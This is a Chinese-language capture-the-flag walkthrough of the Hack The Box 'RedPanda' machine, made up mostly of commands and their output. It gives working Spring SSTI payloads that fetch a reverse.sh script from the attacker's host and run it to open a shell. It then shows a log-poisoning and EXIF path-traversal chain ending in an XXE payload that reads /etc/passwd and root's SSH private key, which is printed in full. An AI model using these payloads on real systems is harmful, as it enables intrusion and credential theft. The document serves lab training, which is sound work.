###### tags: `Hack the box` `HTB` `Easy` `Linux`

# RedPanda
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.37.85 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.37.85:22
Open 10.129.37.85:8080

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy syn-ack
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Wed, 28 Aug 2024 03:49:36 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Wed, 28 Aug 2024 03:49:36 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Wed, 28 Aug 2024 03:49:37 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
```

透過rustscan的結果可以看到該網頁的框架為`Spring Boot`
前往`http://10.129.37.85:8080/search`的search bar可以用[SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#java)
```
*{7*7}
```

可以顯示`49`代表可行，在來試[spring-framework-java](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#spring-framework-java)這邊的注入
```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

也可以成功，接著試著上傳reverse
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('wget 10.10.14.55/reverse.sh').getInputStream())}

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('chmod +x reverse.sh').getInputStream())}

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('sh reverse.sh').getInputStream())}
```

成功後在`/home/woodenk`可得user.txt
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

woodenk@redpanda:~$ cat user.txt
a880ea257f78803e5000d2d2d26313c9
```

用`linpeas.sh`
```
woodenk@redpanda:/tmp$ wget 10.10.14.55/linpeas.sh
woodenk@redpanda:/tmp$ chmod +x linpeas.sh
woodenk@redpanda:/tmp$ ./linpeas.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 24                                                                                                                                    
drwxr-xr-x  5 root root 4096 Jun 23  2022 .
drwxr-xr-x 20 root root 4096 Jun 23  2022 ..
-rwxr-xr-x  1 root root  462 Jun 23  2022 cleanup.sh
drwxr-xr-x  3 root root 4096 Jun 14  2022 credit-score
drwxr-xr-x  6 root root 4096 Jun 14  2022 maven
drwxrwxr-x  5 root root 4096 Jun 14  2022 panda_search
```

查看`cleanup.sh`
```bash
woodenk@redpanda:/opt$ cat cleanup.sh
#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
```

利用`pspy64`看看
```
woodenk@redpanda:/tmp$ wget 10.10.14.55/pspy64
woodenk@redpanda:/tmp$ chmod +x pspy64 
woodenk@redpanda:/tmp$ ./pspy64 

2024/08/28 06:18:01 CMD: UID=0     PID=18977  | /bin/sh -c /root/run_credits.sh 
2024/08/28 06:18:01 CMD: UID=0     PID=18976  | /bin/sh -c /root/run_credits.sh 
2024/08/28 06:18:01 CMD: UID=0     PID=18978  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
2024/08/28 06:20:01 CMD: UID=0     PID=18996  | /usr/sbin/CRON -f 
2024/08/28 06:20:01 CMD: UID=0     PID=18995  | /usr/sbin/CRON -f 
2024/08/28 06:20:01 CMD: UID=0     PID=19000  | /bin/sh -c /root/run_credits.sh 
2024/08/28 06:20:01 CMD: UID=0     PID=18999  | sudo -u woodenk /opt/cleanup.sh 
2024/08/28 06:20:01 CMD: UID=0     PID=18998  | /bin/sh -c /root/run_credits.sh 
2024/08/28 06:20:01 CMD: UID=0     PID=18997  | /bin/sh -c sudo -u woodenk /opt/cleanup.sh 
2024/08/28 06:20:01 CMD: UID=0     PID=19001  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
2024/08/28 06:20:01 CMD: UID=1000  PID=19004  | /bin/bash /opt/cleanup.sh 
2024/08/28 06:20:01 CMD: UID=1000  PID=19002  | /bin/bash /opt/cleanup.sh 
2024/08/28 06:20:01 CMD: UID=1000  PID=19010  | /bin/bash /opt/cleanup.sh 
2024/08/28 06:20:01 CMD: UID=1000  PID=19011  | /bin/bash /opt/cleanup.sh 
2024/08/28 06:20:01 CMD: UID=???   PID=19014  | ???
2024/08/28 06:20:01 CMD: UID=1000  PID=19013  | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 
2024/08/28 06:20:01 CMD: UID=1000  PID=19021  | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ;
```

在`/opt/credit-score/LogParser/final/src/main/java/com/logparser`可以找到`App.java`

```java
<score/LogParser/final/src/main/java/com/logparser$ cat App.java
cat App.java
package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

藉由上面的程式碼可以知道
1. 先讀取`redpanda.log`，如果不是`image`就跳過
2. 利用`getArtist()`處理
3. 利用`artist`這個欄位的值建立`/credits/" + artist + "_creds.xml";`
4. 執行`AddViewTo`

我們要先準備兩個檔案，一個jpg檔，一個xml檔進行注入的，我們可以從網站拉浣熊圖
```
woodenk@redpanda:/opt/panda_search/src/main/resources/static/img$ ls
angy.jpg    florida.jpg  hungy.jpg  mr_puffy.jpg  shy.jpg     smooch.jpg
crafty.jpg  greg.jpg     lazy.jpg   peter.jpg     smiley.jpg

woodenk@redpanda:/opt/panda_search/src/main/resources/static/img$ python3 -m http.server 8000

┌──(kali㉿kali)-[~/htb]
└─$ wget 10.129.36.169:8000/smooch.jpg
```

將`Artist`欄位改成`../tmp/smooch`
```
┌──(kali㉿kali)-[~/htb]
└─$ exiftool -Artist='../tmp/smooch' smooch.jpg
```

再建立一個`smooch_creds.xml`檔裡面有[XXE attack](https://security.snyk.io/vuln/SNYK-JAVA-ORGJDOM-1311147)
可以看能不能先包含`/etc/passwd`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd`"> ]>
<credits>
  <file>
    &xxe;
  </file>
</credits>

┌──(kali㉿kali)-[~/htb]
└─$ chmod 777 smooch_creds.xml 
```

接著在靶機那邊下載兩個檔案，接著對log進行posion後，等一下再查看`smooch_creds.xml`可以看到有成功取得`/etc/passwd`
```
woodenk@redpanda:/tmp$ wget 10.10.14.55/smooch.jpg
woodenk@redpanda:/tmp$ wget 10.10.14.55/smooch_creds.xml

┌──(kali㉿kali)-[~/htb]
└─$ curl -A "evil||/../../../../../../../../../../tmp/smooch.jpg" http://10.129.36.169:8080/


woodenk@redpanda:/tmp$ cat /opt/panda_search/redpanda.log
cat /opt/panda_search/redpanda.log

200||10.10.14.55||evil||/../../../../../../../../../../tmp/smooch.jpg||/

woodenk@redpanda:/tmp$ cat smooch_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <file>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false</file>
</credits>
```

最後把`smooch_creds.xml`改成拿root的ssh key，重新上傳之後照上面的步驟再一次，可以得到root的`id_rsa`了
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <file>
    &xxe;
  </file>
</credits>

woodenk@redpanda:/tmp$ cat smooch_creds.xml
cat smooch_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <file>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</file>
</credits>
```

用它可以得root，在/root得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ chmod 600 id_rsa                                                                   
┌──(kali㉿kali)-[~/htb]
└─$ ssh -i id_rsa root@10.129.36.169

root@redpanda:~# cat root.txt
b417d2cacf7da756a1472ed0fbeffc5d
```

---